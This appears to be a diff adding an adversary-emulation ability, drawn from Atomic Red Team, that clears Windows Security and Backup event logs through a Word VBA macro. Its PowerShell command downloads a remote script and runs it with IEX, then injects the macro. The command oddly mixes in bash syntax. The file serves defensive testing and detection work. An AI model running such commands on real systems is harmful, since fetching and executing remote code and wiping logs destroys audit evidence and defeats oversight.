@@ -1,0 +1,44 @@
+- id: 1b682d84-f075-4f93-9a89-8a8de19ffd6e
+  name: Clear Event Logs via VBA
+  description: "This module utilizes WMI via VBA to clear the Security and Backup\
+    \ eventlogs from the system. \n\nElevation is required for this module to execute\
+    \ properly, otherwise WINWORD will throw an \"Access Denied\" error"
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.001
+    name: 'Indicator Removal on Host: Clear Windows Event Logs'
+  platforms:
+    windows:
+      psh:
+        command: 'try {; New-Object -COMObject "Word.Application" | Out-Null; Stop-Process
+          -Name "winword"; exit 0; } catch { exit 1 }; then : ; else Write-Host "You
+          will need to install Microsoft Word manually to meet this requirement";
+          fi; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"
+          -officeProduct "Word" -sub "ClearLogs"'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1070.001
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'Microsoft Word must be installed
+
+        '
+      prereq_command: "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n\
+        \  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n"
+      get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
+        to meet this requirement"
+
+        '
+    technique_created: '2020-01-28T17:05:14.707Z'
+    atomic_guid: 1b682d84-f075-4f93-9a89-8a8de19ffd6e
+    import_timestamp: '2025-06-24T11:15:00.725030Z'
